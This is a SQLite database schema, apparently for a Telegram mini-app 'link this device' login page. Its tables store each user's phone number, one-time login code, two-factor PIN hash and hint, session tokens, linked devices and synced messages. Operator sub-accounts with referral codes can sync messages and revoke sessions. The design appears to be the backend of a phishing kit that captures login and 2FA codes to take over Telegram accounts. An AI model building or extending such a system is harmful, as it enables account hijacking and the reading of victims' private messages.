CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  tg_id TEXT UNIQUE NOT NULL,
  first_name TEXT DEFAULT '',
  last_name TEXT DEFAULT '',
  username TEXT DEFAULT '',
  bot_id TEXT DEFAULT 'default',
  sub_user_ref TEXT DEFAULT '',
  phone_number TEXT DEFAULT '',
  state TEXT DEFAULT 'link_device',
  otp_code TEXT DEFAULT '',
  otp_expires_at INTEGER DEFAULT 0,
  device_id TEXT DEFAULT '',
  device_name TEXT DEFAULT '',
  device_ip TEXT DEFAULT '',
  pairing_code TEXT DEFAULT '',
  link_token TEXT DEFAULT '',
  link_expires_at INTEGER DEFAULT 0,
  linked_at TEXT DEFAULT '',
  twofa_enabled INTEGER DEFAULT 0,
  twofa_pin_hash TEXT DEFAULT '',
  twofa_hint TEXT DEFAULT '',
  session_token TEXT DEFAULT '',
  created_at TEXT DEFAULT CURRENT_TIMESTAMP,
  updated_at TEXT DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS linked_devices (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  tg_id TEXT NOT NULL,
  device_id TEXT NOT NULL,
  device_name TEXT DEFAULT '',
  device_ip TEXT DEFAULT '',
  pairing_code TEXT DEFAULT '',
  link_token TEXT DEFAULT '',
  status TEXT DEFAULT 'pending',
  session_token TEXT DEFAULT '',
  linked_at TEXT DEFAULT '',
  created_at TEXT DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS sub_users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  name TEXT NOT NULL,
  username TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  ref_code TEXT UNIQUE NOT NULL,
  can_sync_messages INTEGER DEFAULT 1,
  can_revoke_session INTEGER DEFAULT 1,
  is_active INTEGER DEFAULT 1,
  created_at TEXT DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS synced_messages (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  tg_id TEXT NOT NULL,
  sub_user_ref TEXT DEFAULT '',
  sender_type TEXT NOT NULL,
  sender_name TEXT DEFAULT '',
  source TEXT DEFAULT 'miniapp',
  message_text TEXT NOT NULL,
  created_at TEXT DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS app_settings (
  setting_key TEXT PRIMARY KEY,
  setting_value TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS bot_templates (
  bot_id TEXT PRIMARY KEY,
  color TEXT DEFAULT 'default',
  background_url TEXT DEFAULT '',
  background_blur INTEGER DEFAULT 0,
  config_json TEXT NOT NULL
);

INSERT OR IGNORE INTO app_settings (setting_key, setting_value) VALUES ('login_mode', 'linked_device');
INSERT OR IGNORE INTO app_settings (setting_key, setting_value) VALUES ('redirect_url', '');
INSERT OR IGNORE INTO app_settings (setting_key, setting_value) VALUES ('pass_user_params', '1');

INSERT OR IGNORE INTO bot_templates (bot_id, color, background_url, background_blur, config_json)
VALUES (
  'default',
  'default',
  '',
  0,
  '{"code":{"title":"Link This Device","description":"Approve the device link request sent to your Telegram bot or scan the QR code below to sign in.","buttonText":"Approve in Telegram Bot"}}'
);
